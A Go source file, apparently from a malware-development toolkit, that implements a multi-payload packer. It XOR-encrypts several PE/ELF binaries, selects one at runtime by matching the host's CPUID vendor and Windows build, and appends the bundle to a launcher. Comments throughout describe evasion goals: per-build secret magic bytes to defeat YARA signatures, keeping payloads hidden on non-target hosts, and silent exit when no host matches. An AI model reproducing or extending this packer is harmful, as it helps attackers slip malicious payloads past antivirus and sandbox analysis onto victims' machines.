package packer

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
)

// BundleProfile groups the per-build IOCs an operator can override
// to randomise yara-able byte patterns across deployments. Per
// Kerckhoffs's principle: the wire format stays public; only the
// 4-byte BundleMagic and the 8-byte AppendBundle footer are the
// per-build secrets. A defender can identify "this is a maldev
// bundle" only with the operator's secret in hand.
//
// Use [DeriveBundleProfile] to get a deterministic profile from any
// secret string; both fields zero means "use the canonical magics
// from the wire-format spec" (back-compat default).
type BundleProfile struct {
	Magic       uint32
	FooterMagic [8]byte
}

// DeriveBundleProfile returns a [BundleProfile] derived from secret
// via SHA-256. Same secret → same profile. Empty / nil secret yields
// the canonical {BundleMagic, BundleFooterMagic} pair so a build with
// no -secret flag is wire-compatible with the public spec.
//
// A 16+ byte secret is recommended (operator's per-deployment GUID,
// build timestamp + nonce, etc.). The output is 4 + 8 = 12 derived
// bytes; the SHA-256 collision space is more than sufficient.
func DeriveBundleProfile(secret []byte) BundleProfile {
	if len(secret) == 0 {
		return BundleProfile{Magic: BundleMagic, FooterMagic: BundleFooterMagic}
	}
	sum := sha256.Sum256(secret)
	var p BundleProfile
	p.Magic = binary.LittleEndian.Uint32(sum[:4])
	copy(p.FooterMagic[:], sum[4:12])
	return p
}

// Bundle wire format constants.
//
// On-disk layout (all little-endian):
//
//	[BundleHeader               (32 bytes)]
//	[FingerprintEntry × Count   (48 bytes each)]
//	[PayloadEntry × Count       (32 bytes each)]
//	[EncryptedPayloadData × Count (variable, concatenated)]
//
// The bundle header sits at the start of the bundle blob; the binary's
// entry point points into the bundle stub (which lives just past
// EncryptedPayloadData). All offsets in the header are RVAs relative to
// the bundle's first byte.
//
// See docs/superpowers/specs/2026-05-08-packer-multi-target-bundle.md
// for the full design and threat model.
const (
	// BundleMagic is the four-byte ASCII tag at offset 0 — "MLDV".
	BundleMagic uint32 = 0x56444C4D

	// BundleVersion is the wire-format version surfaced in BundleHeader.
	BundleVersion uint16 = 0x0001

	// BundleHeaderSize, BundleFingerprintEntrySize, BundlePayloadEntrySize
	// are the on-disk sizes of each region's entry.
	BundleHeaderSize           = 32
	BundleFingerprintEntrySize = 48
	BundlePayloadEntrySize     = 32

	// BundleMaxPayloads is the practical upper bound on payload count.
	// Wire format allows uint16 (65 535); we cap at 255 per spec to keep
	// the fingerprint-loop stub size sane.
	BundleMaxPayloads = 255
)

// PredicateType bitmask flags for FingerprintPredicate.PredicateType.
//
// Within a single FingerprintEntry, all enabled bits are ANDed: every
// active check must pass for the entry to match. Across entries, the
// first matching entry wins.
const (
	PTCPUIDVendor   uint8 = 1 << 0 // 12-byte CPUID EAX=0 vendor string check
	PTWinBuild      uint8 = 1 << 1 // PEB.OSBuildNumber range check
	PTCPUIDFeatures uint8 = 1 << 2 // CPUID EAX=1 ECX feature mask check
	PTMatchAll      uint8 = 1 << 3 // wildcard — matches any host
)

// BundleFallbackBehaviour controls what the stub does when no
// FingerprintEntry matches the host.
type BundleFallbackBehaviour uint32

const (
	// BundleFallbackExit silently calls ExitProcess(0) / exit(0). Default.
	BundleFallbackExit BundleFallbackBehaviour = 0
	// BundleFallbackCrash deliberately faults to surface a sandbox alert.
	BundleFallbackCrash BundleFallbackBehaviour = 1
	// BundleFallbackFirst selects payload 0 unconditionally. Operator
	// opt-in for dev/test only — defeats the per-host secrecy property.
	BundleFallbackFirst BundleFallbackBehaviour = 2
)

// FingerprintPredicate encodes the host-matching logic for one payload.
//
// PredicateType is a bitmask of PT* constants. Within one predicate all
// enabled checks are ANDed; across predicates the bundle stub picks the
// first matching entry.
type FingerprintPredicate struct {
	PredicateType uint8

	// VendorString is the 12-byte CPUID vendor to match. Zero/empty means
	// wildcard (any vendor). Only consulted when PTCPUIDVendor is set.
	VendorString [12]byte

	// BuildMin and BuildMax form an inclusive Windows build-number range.
	// Zero on either end means "no bound on this side". Only consulted
	// when PTWinBuild is set.
	BuildMin uint32
	BuildMax uint32

	// CPUIDFeatureMask + CPUIDFeatureValue check
	// (CPUID[1].ECX & Mask) == Value. Mask=0 skips the check.
	CPUIDFeatureMask  uint32
	CPUIDFeatureValue uint32

	// Negate inverts the entire predicate match outcome.
	Negate bool
}

// BundlePayload is one payload binary paired with its fingerprint
// predicate and the per-payload pack options.
type BundlePayload struct {
	// Binary is the original PE/ELF bytes to embed.
	Binary []byte
	// Fingerprint is the host-matching rule for this payload.
	Fingerprint FingerprintPredicate
}

// BundleOptions parameterises [PackBinaryBundle].
type BundleOptions struct {
	// FallbackBehaviour selects the action when no predicate matches.
	FallbackBehaviour BundleFallbackBehaviour
	// FixedKey, when non-nil, is the per-payload XOR key reused across
	// every payload — defeats the per-payload-secrecy property the spec
	// advertises and exists strictly for test determinism / reproducible
	// pack output. Production callers MUST leave this nil so each
	// payload gets a fresh random 16-byte key. Field is named to make
	// the call site self-explain its intent.
	FixedKey []byte
	// Profile carries the per-build IOC overrides (BundleMagic +
	// AppendBundle footer). Zero value = canonical wire-format
	// magics. Use [DeriveBundleProfile] to derive both from a
	// per-deployment secret string. Operators MUST set a fresh
	// secret per ship cycle to keep yara signatures from clustering
	// across deployments — Kerckhoffs in practice.
	Profile BundleProfile
}

// Sentinels surfaced by [PackBinaryBundle].
var (
	// ErrEmptyBundle fires when payloads is nil or has zero length.
	ErrEmptyBundle = errors.New("packer: empty bundle")
	// ErrBundleTooLarge fires when len(payloads) exceeds BundleMaxPayloads.
	ErrBundleTooLarge = errors.New("packer: bundle exceeds 255 payloads")
	// ErrBundleTruncated fires when a blob is shorter than the minimum
	// header. Surfaced by [InspectBundle] / [SelectPayload] / [UnpackBundle].
	ErrBundleTruncated = errors.New("packer: bundle truncated")
	// ErrBundleBadMagic fires when the magic dword does not match
	// [BundleMagic]. Surfaced by [InspectBundle].
	ErrBundleBadMagic = errors.New("packer: bundle bad magic")
	// ErrBundleOutOfRange fires when a declared offset / size escapes
	// the blob bounds. Surfaced by [InspectBundle].
	ErrBundleOutOfRange = errors.New("packer: bundle offset out of range")
)

// PackBinaryBundle packs N payload binaries into a single multi-target
// bundle blob. The bundle is a flat byte slice in spec layout, with
// each payload XOR-encrypted under an independent random 16-byte key.
// The runtime stub-side fingerprint evaluator and PE/ELF container
// injection live in `pe/packer/stubgen/stage1` and `pe/packer/transform`
// respectively (see [Limitations] for which pieces are shipping).
//
// Returns the serialised bundle bytes. The caller is responsible for
// wrapping the bundle in a PE/ELF container — see [PackBinary] for the
// single-payload equivalent and the spec's §5 Stub Flow for the eventual
// multi-payload entry point.
//
// Errors: [ErrEmptyBundle], [ErrBundleTooLarge], plus crypto/rand
// failures wrapping when FixedKey is nil.
func PackBinaryBundle(payloads []BundlePayload, opts BundleOptions) ([]byte, error) {
	if len(payloads) == 0 {
		return nil, ErrEmptyBundle
	}
	if len(payloads) > BundleMaxPayloads {
		return nil, fmt.Errorf("%w: %d > %d", ErrBundleTooLarge, len(payloads), BundleMaxPayloads)
	}

	count := uint16(len(payloads))
	fpTableOff := uint32(BundleHeaderSize)
	plTableOff := fpTableOff + uint32(count)*BundleFingerprintEntrySize
	dataOff := plTableOff + uint32(count)*BundlePayloadEntrySize

	// Encrypt each payload up front so we know the ciphertext sizes
	// (XOR is size-preserving but factor out for future cipher swaps).
	type encrypted struct {
		bytes []byte
		key   [16]byte
		plain uint32
	}
	encs := make([]encrypted, count)
	totalSize := dataOff
	for i, p := range payloads {
		var key [16]byte
		if opts.FixedKey != nil {
			copy(key[:], opts.FixedKey)
		} else if _, err := rand.Read(key[:]); err != nil {
			return nil, fmt.Errorf("packer: bundle key %d: %w", i, err)
		}
		ct := make([]byte, len(p.Binary))
		for j := range p.Binary {
			ct[j] = p.Binary[j] ^ key[j%16]
		}
		encs[i] = encrypted{bytes: ct, key: key, plain: uint32(len(p.Binary))}
		totalSize += uint32(len(ct))
	}

	// Pre-size the output: header + tables + concatenated payload data.
	// Avoids the (re)allocation churn of the previous append-in-loop form.
	out := make([]byte, totalSize)

	// BundleHeader (32 bytes). Magic resolves through opts.Profile —
	// zero value = canonical [BundleMagic]; non-zero = operator's
	// per-build IOC override.
	magic := opts.Profile.Magic
	if magic == 0 {
		magic = BundleMagic
	}
	binary.LittleEndian.PutUint32(out[0:4], magic)
	binary.LittleEndian.PutUint16(out[4:6], BundleVersion)
	binary.LittleEndian.PutUint16(out[6:8], count)
	binary.LittleEndian.PutUint32(out[8:12], fpTableOff)
	binary.LittleEndian.PutUint32(out[12:16], plTableOff)
	binary.LittleEndian.PutUint32(out[16:20], dataOff)
	binary.LittleEndian.PutUint32(out[20:24], uint32(opts.FallbackBehaviour))
	// Reserved [24:32] left zero by make.

	// FingerprintEntry × N.
	for i, p := range payloads {
		off := int(fpTableOff) + i*BundleFingerprintEntrySize
		out[off] = p.Fingerprint.PredicateType
		if p.Fingerprint.Negate {
			out[off+1] = 1
		}
		copy(out[off+4:off+16], p.Fingerprint.VendorString[:])
		binary.LittleEndian.PutUint32(out[off+16:off+20], p.Fingerprint.BuildMin)
		binary.LittleEndian.PutUint32(out[off+20:off+24], p.Fingerprint.BuildMax)
		binary.LittleEndian.PutUint32(out[off+24:off+28], p.Fingerprint.CPUIDFeatureMask)
		binary.LittleEndian.PutUint32(out[off+28:off+32], p.Fingerprint.CPUIDFeatureValue)
		// Reserved2 [off+32:off+48] left zero.
	}

	// PayloadEntry × N + EncryptedPayloadData (in one pass).
	dataCursor := dataOff
	for i, e := range encs {
		off := int(plTableOff) + i*BundlePayloadEntrySize
		binary.LittleEndian.PutUint32(out[off:off+4], dataCursor)
		binary.LittleEndian.PutUint32(out[off+4:off+8], uint32(len(e.bytes)))
		binary.LittleEndian.PutUint32(out[off+8:off+12], e.plain)
		out[off+12] = 1 // CipherType = XOR-rolling (16-byte key)
		// off+13..off+16 reserved
		copy(out[off+16:off+32], e.key[:])
		copy(out[dataCursor:], e.bytes)
		dataCursor += uint32(len(e.bytes))
	}

	return out, nil
}

// BundleInfo is the parsed-header view of a bundle blob, populated by
// [InspectBundle]. Fields mirror the spec §3 wire-format regions: a
// fixed BundleHeader followed by per-entry FingerprintEntry +
// PayloadEntry slices in matching order.
//
// All offsets are RVAs from the start of the bundle blob. Sizes are
// measured in bytes. The Entries slice always has len(Entries) == Count.
type BundleInfo struct {
	Magic             uint32
	Version           uint16
	Count             uint16
	FpTableOffset     uint32
	PayloadTableOffset uint32
	DataOffset        uint32
	FallbackBehaviour BundleFallbackBehaviour
	Entries           []BundleEntryInfo
}

// BundleEntryInfo is one parsed FingerprintEntry + PayloadEntry pair.
// Wire fields are decoded into typed Go fields; unrecognised
// PredicateType bits are preserved verbatim so callers can flag them.
type BundleEntryInfo struct {
	// Fingerprint side.
	PredicateType     uint8
	Negate            bool
	VendorString      [12]byte
	BuildMin          uint32
	BuildMax          uint32
	CPUIDFeatureMask  uint32
	CPUIDFeatureValue uint32

	// Payload side.
	DataRVA       uint32
	DataSize      uint32
	PlaintextSize uint32
	CipherType    uint8
	Key           [16]byte
}

// InspectBundle parses a bundle blob's header and per-entry tables into
// a [BundleInfo] for inspection. It is the structured-output companion
// to the human-readable `cmd/packer bundle -inspect` flow and the
// preferred entrypoint for test assertions over the wire format.
//
// Validates: magic, header length, that the declared region offsets
// stay inside the blob, and that each PayloadEntry's data range stays
// inside the blob. On any structural error it returns a wrapped error;
// callers can compare against [ErrBundleTruncated] /
// [ErrBundleBadMagic] / [ErrBundleOutOfRange] to differentiate.
func InspectBundle(bundle []byte) (BundleInfo, error) {
	var info BundleInfo
	if len(bundle) < BundleHeaderSize {
		return info, fmt.Errorf("%w: %d < %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	info.Magic = binary.LittleEndian.Uint32(bundle[0:4])
	if info.Magic != BundleMagic {
		return info, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, info.Magic, BundleMagic)
	}
	info.Version = binary.LittleEndian.Uint16(bundle[4:6])
	info.Count = binary.LittleEndian.Uint16(bundle[6:8])
	info.FpTableOffset = binary.LittleEndian.Uint32(bundle[8:12])
	info.PayloadTableOffset = binary.LittleEndian.Uint32(bundle[12:16])
	info.DataOffset = binary.LittleEndian.Uint32(bundle[16:20])
	info.FallbackBehaviour = BundleFallbackBehaviour(binary.LittleEndian.Uint32(bundle[20:24]))

	count := int(info.Count)
	fpEnd := int(info.FpTableOffset) + count*BundleFingerprintEntrySize
	plEnd := int(info.PayloadTableOffset) + count*BundlePayloadEntrySize
	if fpEnd > len(bundle) || plEnd > len(bundle) {
		return info, fmt.Errorf("%w: fpEnd=%d plEnd=%d blob=%d", ErrBundleOutOfRange, fpEnd, plEnd, len(bundle))
	}

	info.Entries = make([]BundleEntryInfo, count)
	for i := 0; i < count; i++ {
		fpOff := int(info.FpTableOffset) + i*BundleFingerprintEntrySize
		plOff := int(info.PayloadTableOffset) + i*BundlePayloadEntrySize
		e := &info.Entries[i]
		e.PredicateType = bundle[fpOff]
		e.Negate = bundle[fpOff+1]&0x01 != 0
		copy(e.VendorString[:], bundle[fpOff+4:fpOff+16])
		e.BuildMin = binary.LittleEndian.Uint32(bundle[fpOff+16 : fpOff+20])
		e.BuildMax = binary.LittleEndian.Uint32(bundle[fpOff+20 : fpOff+24])
		e.CPUIDFeatureMask = binary.LittleEndian.Uint32(bundle[fpOff+24 : fpOff+28])
		e.CPUIDFeatureValue = binary.LittleEndian.Uint32(bundle[fpOff+28 : fpOff+32])

		e.DataRVA = binary.LittleEndian.Uint32(bundle[plOff : plOff+4])
		e.DataSize = binary.LittleEndian.Uint32(bundle[plOff+4 : plOff+8])
		e.PlaintextSize = binary.LittleEndian.Uint32(bundle[plOff+8 : plOff+12])
		e.CipherType = bundle[plOff+12]
		copy(e.Key[:], bundle[plOff+16:plOff+32])

		if int(e.DataRVA)+int(e.DataSize) > len(bundle) {
			return info, fmt.Errorf("%w: entry %d data %d..+%d outside blob (%d)",
				ErrBundleOutOfRange, i, e.DataRVA, e.DataSize, len(bundle))
		}
	}
	return info, nil
}

// BundleFooterMagic is the 8-byte sentinel an [AppendBundle] launcher
// writes at the very end of the wrapped binary so it can locate its
// own bundle blob without scanning. Reads as "MLDV-END" in ASCII.
var BundleFooterMagic = [8]byte{'M', 'L', 'D', 'V', '-', 'E', 'N', 'D'}

// AppendBundleWith is the per-build-profile-aware variant of
// [AppendBundle]. The footer's 8-byte sentinel uses
// `profile.FooterMagic` instead of the canonical
// [BundleFooterMagic]. Operators wrapping with a custom
// [BundleProfile] (typically derived from `-secret` via
// [DeriveBundleProfile]) MUST use this variant; the matching
// launcher must know the same FooterMagic at runtime
// (typically injected via -ldflags -X). Caller-side parser is
// [ExtractBundleWith].
func AppendBundleWith(launcher []byte, bundle []byte, profile BundleProfile) []byte {
	footer := profile.FooterMagic
	if footer == ([8]byte{}) {
		footer = BundleFooterMagic
	}
	bundleOff := uint64(len(launcher))
	out := make([]byte, 0, len(launcher)+len(bundle)+16)
	out = append(out, launcher...)
	out = append(out, bundle...)
	var off [8]byte
	binary.LittleEndian.PutUint64(off[:], bundleOff)
	out = append(out, off[:]...)
	out = append(out, footer[:]...)
	return out
}

// ExtractBundleWith is the per-build-profile-aware variant of
// [ExtractBundle]. Validates the footer against `profile.FooterMagic`
// instead of the canonical [BundleFooterMagic].
func ExtractBundleWith(wrapped []byte, profile BundleProfile) ([]byte, error) {
	expected := profile.FooterMagic
	if expected == ([8]byte{}) {
		expected = BundleFooterMagic
	}
	if len(wrapped) < 16 {
		return nil, fmt.Errorf("%w: %d < 16-byte footer", ErrBundleTruncated, len(wrapped))
	}
	footer := wrapped[len(wrapped)-8:]
	if !bytes.Equal(footer, expected[:]) {
		return nil, fmt.Errorf("%w: footer %q != %q", ErrBundleBadMagic, footer, expected[:])
	}
	bundleOff := binary.LittleEndian.Uint64(wrapped[len(wrapped)-16 : len(wrapped)-8])
	if bundleOff > uint64(len(wrapped)-16) {
		return nil, fmt.Errorf("%w: bundleOff %d > footer-start %d",
			ErrBundleOutOfRange, bundleOff, len(wrapped)-16)
	}
	return wrapped[bundleOff : len(wrapped)-16], nil
}

// AppendBundle returns launcher bytes with `bundle` concatenated at
// the end, followed by an 8-byte little-endian offset of the bundle's
// first byte and the [BundleFooterMagic] sentinel:
//
//	[ launcher bytes        ]
//	[ bundle blob           ]
//	[ 8 BE: bundleStartOff  ]
//	[ 8 BE: BundleFooterMagic ]
//
// Total 16-byte footer. The launcher reads its own binary at runtime,
// inspects the last 16 bytes, validates the magic, slices back to the
// bundle bytes, and proceeds with [MatchBundleHost] / [UnpackBundle].
//
// Returns a fresh slice; the input launcher slice is not modified.
func AppendBundle(launcher []byte, bundle []byte) []byte {
	bundleOff := uint64(len(launcher))
	out := make([]byte, 0, len(launcher)+len(bundle)+16)
	out = append(out, launcher...)
	out = append(out, bundle...)
	var off [8]byte
	binary.LittleEndian.PutUint64(off[:], bundleOff)
	out = append(out, off[:]...)
	out = append(out, BundleFooterMagic[:]...)
	return out
}

// ExtractBundle is the inverse of [AppendBundle]: given the full bytes
// of an [AppendBundle]-wrapped launcher (typically read from
// `/proc/self/exe` or `os.Executable()`), it returns a slice over the
// embedded bundle. Errors when the footer magic is missing or the
// declared offset escapes the blob.
//
// The returned slice references the input — caller must not mutate it
// while the bundle is in use.
func ExtractBundle(wrapped []byte) ([]byte, error) {
	if len(wrapped) < 16 {
		return nil, fmt.Errorf("%w: %d < 16-byte footer", ErrBundleTruncated, len(wrapped))
	}
	footer := wrapped[len(wrapped)-8:]
	if !bytes.Equal(footer, BundleFooterMagic[:]) {
		return nil, fmt.Errorf("%w: footer %q != %q", ErrBundleBadMagic, footer, BundleFooterMagic[:])
	}
	bundleOff := binary.LittleEndian.Uint64(wrapped[len(wrapped)-16 : len(wrapped)-8])
	if bundleOff > uint64(len(wrapped)-16) {
		return nil, fmt.Errorf("%w: bundleOff %d > footer-start %d",
			ErrBundleOutOfRange, bundleOff, len(wrapped)-16)
	}
	return wrapped[bundleOff : len(wrapped)-16], nil
}

// resolvedMagic returns the magic the parser should validate against:
// the operator's per-build override if non-zero, else the canonical
// wire-format default. Centralised so every *With variant agrees.
func resolvedMagic(p BundleProfile) uint32 {
	if p.Magic != 0 {
		return p.Magic
	}
	return BundleMagic
}

// InspectBundleWith is the per-build-profile-aware variant of
// [InspectBundle]. Validates the magic against `profile.Magic`
// (canonical default when zero) instead of [BundleMagic].
func InspectBundleWith(bundle []byte, profile BundleProfile) (BundleInfo, error) {
	var info BundleInfo
	if len(bundle) < BundleHeaderSize {
		return info, fmt.Errorf("%w: %d < %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if got := binary.LittleEndian.Uint32(bundle[0:4]); got != expected {
		return info, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, got, expected)
	}
	// Past the magic, the rest of the parse is identical to InspectBundle.
	// Re-parse via the canonical helper after temporarily patching the
	// magic so we don't duplicate the body.
	tmp := append([]byte(nil), bundle...)
	binary.LittleEndian.PutUint32(tmp[0:4], BundleMagic)
	info, err := InspectBundle(tmp)
	if err != nil {
		return info, err
	}
	info.Magic = expected
	return info, nil
}

// SelectPayloadWith is the per-build-profile-aware variant of
// [SelectPayload]. Same matching semantics; only the magic-validation
// gate differs.
func SelectPayloadWith(bundle []byte, profile BundleProfile, hostVendor [12]byte, hostBuild uint32) (int, error) {
	if len(bundle) < BundleHeaderSize {
		return -1, fmt.Errorf("%w: %d < %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if got := binary.LittleEndian.Uint32(bundle[0:4]); got != expected {
		return -1, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, got, expected)
	}
	tmp := append([]byte(nil), bundle...)
	binary.LittleEndian.PutUint32(tmp[0:4], BundleMagic)
	return SelectPayload(tmp, hostVendor, hostBuild)
}

// UnpackBundleWith is the per-build-profile-aware variant of
// [UnpackBundle].
func UnpackBundleWith(bundle []byte, idx int, profile BundleProfile) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < header %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if got := binary.LittleEndian.Uint32(bundle[0:4]); got != expected {
		return nil, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, got, expected)
	}
	tmp := append([]byte(nil), bundle...)
	binary.LittleEndian.PutUint32(tmp[0:4], BundleMagic)
	return UnpackBundle(tmp, idx)
}

// SelectPayload is the pure-Go reference implementation of the bundle
// stub's fingerprint-matching logic. Given a bundle blob and the host's
// CPUID vendor + Windows build number, it returns the index of the first
// FingerprintEntry whose predicate matches, or -1 if none does.
//
// Matching logic per spec §3.4:
//   - PT_MATCH_ALL (bit 3): always matches.
//   - Otherwise, every set bit in PredicateType must pass:
//     - PT_CPUID_VENDOR: VendorString == hostVendor (or all-zero wildcard)
//     - PT_WIN_BUILD: BuildMin <= hostBuild <= BuildMax
//       (zero on either bound means no bound on that side)
//     - PT_CPUID_FEATURES: not consulted by SelectPayload — caller would
//       supply the feature ECX value separately; deferred until needed.
//   - Negate flag inverts the entire entry's match outcome.
//
// On no match, the caller applies FallbackBehaviour from the header.
//
// The runtime stub-side asm evaluator (in `pe/packer/stubgen/stage1`)
// mirrors this logic byte-for-byte (excepting the feature-mask branch
// not yet wired in either path).
func SelectPayload(bundle []byte, hostVendor [12]byte, hostBuild uint32) (int, error) {
	if len(bundle) < BundleHeaderSize {
		return -1, fmt.Errorf("%w: %d < %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != BundleMagic {
		return -1, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, magic, BundleMagic)
	}
	count := int(binary.LittleEndian.Uint16(bundle[6:8]))
	fpTableOff := int(binary.LittleEndian.Uint32(bundle[8:12]))
	if fpTableOff+count*BundleFingerprintEntrySize > len(bundle) {
		return -1, fmt.Errorf("%w: fingerprint table outside blob", ErrBundleOutOfRange)
	}

	for i := 0; i < count; i++ {
		off := fpTableOff + i*BundleFingerprintEntrySize
		predType := bundle[off]
		negate := bundle[off+1]&0x01 != 0

		match := evaluateEntry(bundle[off:off+BundleFingerprintEntrySize], hostVendor, hostBuild)
		if predType&PTMatchAll != 0 {
			match = true
		}
		if negate {
			match = !match
		}
		if match {
			return i, nil
		}
	}
	return -1, nil
}

// evaluateEntry runs the AND-combined predicate checks for one
// FingerprintEntry slice. Caller has already verified the slice is at
// least BundleFingerprintEntrySize bytes long.
func evaluateEntry(entry []byte, hostVendor [12]byte, hostBuild uint32) bool {
	predType := entry[0]
	if predType == 0 {
		// No checks set — empty predicate matches nothing (use PTMatchAll
		// for "always match"). Defensive: prevents accidental wide matches.
		return false
	}

	if predType&PTCPUIDVendor != 0 {
		var want [12]byte
		copy(want[:], entry[4:16])
		if want != [12]byte{} && want != hostVendor {
			return false
		}
	}
	if predType&PTWinBuild != 0 {
		bMin := binary.LittleEndian.Uint32(entry[16:20])
		bMax := binary.LittleEndian.Uint32(entry[20:24])
		if bMin != 0 && hostBuild < bMin {
			return false
		}
		if bMax != 0 && hostBuild > bMax {
			return false
		}
	}
	// PTCPUIDFeatures — caller-supplied ECX not threaded through this
	// signature; once added, AND a (hostECX & mask) == value check here.
	return true
}

// UnpackBundle is the host-side inverse of [PackBinaryBundle]: it parses a
// bundle blob, locates the payload at index `idx`, and decrypts it using
// the on-disk key.
//
// This is a debugging / build-host helper. The runtime stub
// re-implements the same logic in asm and never exposes keys to memory
// unless its predicate matched.
func UnpackBundle(bundle []byte, idx int) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < header %d", ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != BundleMagic {
		return nil, fmt.Errorf("%w: %#x != %#x", ErrBundleBadMagic, magic, BundleMagic)
	}
	count := binary.LittleEndian.Uint16(bundle[6:8])
	if idx < 0 || idx >= int(count) {
		return nil, fmt.Errorf("packer: bundle index %d out of range [0, %d)", idx, count)
	}
	plTableOff := binary.LittleEndian.Uint32(bundle[12:16])
	entryOff := int(plTableOff) + idx*BundlePayloadEntrySize
	if entryOff+BundlePayloadEntrySize > len(bundle) {
		return nil, fmt.Errorf("%w: PayloadEntry %d outside blob", ErrBundleOutOfRange, idx)
	}
	dataRVA := binary.LittleEndian.Uint32(bundle[entryOff : entryOff+4])
	dataSize := binary.LittleEndian.Uint32(bundle[entryOff+4 : entryOff+8])
	if int(dataRVA)+int(dataSize) > len(bundle) {
		return nil, fmt.Errorf("%w: payload %d data outside blob", ErrBundleOutOfRange, idx)
	}
	var key [16]byte
	copy(key[:], bundle[entryOff+16:entryOff+32])
	ct := bundle[dataRVA : dataRVA+dataSize]
	pt := make([]byte, len(ct))
	for j := range ct {
		pt[j] = ct[j] ^ key[j%16]
	}
	return pt, nil
}
